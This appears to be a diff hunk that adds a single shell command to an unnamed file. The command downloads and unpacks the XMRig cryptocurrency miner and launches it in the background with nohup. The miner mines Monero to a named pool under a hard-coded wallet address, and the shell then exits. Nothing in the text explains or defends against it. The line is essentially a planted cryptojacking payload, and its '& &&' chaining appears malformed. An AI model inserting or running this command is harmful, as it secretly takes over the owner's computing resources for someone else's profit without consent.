@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz && tar xvzf xmrig-6.18.0-focal-x64.tar.gz && cd xmrig-6.18.0 && nohup ./xmrig -o pool.hashvault.pro:443 -u 85hTUhYvCMAD85kwUYVNUEFEgema9qAWtStqzyFpKZTaiKqdpxhxf4V4V2C86cdbneMewrYqcjWRs8J7fUv5YpFQEMoyNCq -p binan2 -k --tls & && exit
